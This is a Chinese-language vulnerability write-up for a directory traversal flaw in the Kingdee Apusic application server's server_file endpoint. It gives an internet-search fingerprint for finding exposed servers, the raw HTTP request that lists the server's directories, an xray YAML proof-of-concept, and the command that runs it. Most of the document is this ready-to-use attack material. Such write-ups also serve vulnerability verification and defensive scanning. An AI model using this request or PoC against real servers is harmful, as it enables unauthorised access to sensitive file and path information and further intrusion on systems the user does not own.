# 金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞
## 漏洞描述

金蝶Apusic应用服务器是国内第一个通过J2EE测试认证的应用服务器，全球第四家获得JavaEE 5.0认证授权的产品，完全实现J2EE等企业计算相关的工业规范及标准代码简洁优化，具备了数据持久性、事务完整性、消息传输的可靠性、集群功能的高可用性、以及跨平台的支持等特点。金蝶Apusic应用服务器server_file处存在目录遍历漏洞，攻击者可以从其中获取网站路径等敏感信息进一步攻击。

## 影响版本
```
金蝶OA 9.0  Apusic应用服务器(中间件)
```

## 网络测绘
```
app="Apusic-公司产品" && title=="欢迎使用Apusic应用服务器"
```

## 环境搭建

-
## 漏洞复现

![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309201731447.png)


## 数据包
```
GET /admin/protected/selector/server_file/files?folder=/ HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0

```

## YAML代码
```
name: poc-yaml-kingdee-apusic-server-file-traversal
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /admin/protected/selector/server_file/files?folder=/
    expression: response.status==200 && response.body.bcontains(b'"total":') && response.body.bcontains(b'"rows":') && response.body.bcontains(b'"name":') && response.body.bcontains(b'"path":') && response.body.bcontains(b'"folder":')
expression: r0()
detail:
  author: klear
  links:
    - https://vuls.info/PeiQi/wiki/oa/%E9%87%91%E8%9D%B6OA/%E9%87%91%E8%9D%B6OA%20Apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%B8%AD%E9%97%B4%E4%BB%B6%20server_file%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/?h=apusic

```

## xray调用

```
xraypro  --config ./debug.yaml ws --poc poc-yaml-kingdee-apusic-server-file-traversal.yml --url xx

```

![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309201732070.png)
